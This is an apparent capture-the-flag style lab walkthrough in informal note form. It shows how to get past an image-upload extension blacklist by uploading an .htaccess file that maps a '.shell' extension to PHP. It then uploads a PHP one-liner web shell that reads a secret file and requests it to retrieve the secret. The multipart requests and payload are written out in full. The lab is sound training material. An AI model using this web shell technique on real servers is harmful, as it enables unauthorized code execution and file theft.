# Web shell upload via extension blacklist bypass

## This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

## To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

## You can log in to your own account using the following credentials: `wiener:peter`

NOTE:
application/x-httpd-php => for .php
now
application/x-httpd-php .shell => .shell but php code will run

---

### step 1

upload image file and intercept send to repaeter

delete png data

------WebKitFormBoundaryYGdUrBsBP2Tz4JmV

### Content-Disposition: form-data; name="avatar"; filename="meme.jpg"

### Content-Type: image/jpeg

------WebKitFormBoundaryYGdUrBsBP2Tz4JmV
Content-Disposition: form-data; name="user"

---

now change filename="meme.jpg" and Content-Type: image/jpeg

------WebKitFormBoundaryYGdUrBsBP2Tz4JmV

### Content-Disposition: form-data; name="avatar"; filename=".htaccess"

### Content-Type: text/plain

### AddType application/x-httpd-php .shell

------WebKitFormBoundaryYGdUrBsBP2Tz4JmV
Content-Disposition: form-data; name="user"

---

------WebKitFormBoundaryYGdUrBsBP2Tz4JmV
Content-Disposition: form-data; name="avatar"; filename="test.shell"

### Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundaryYGdUrBsBP2Tz4JmV
Content-Disposition: form-data; name="user"

---

### step2

GET /files/avatars/test.shell HTTP/1.1
into repeater
INkA8n9c9l0NSJwt2lPwWqq91R0qesDb

submit lab solved
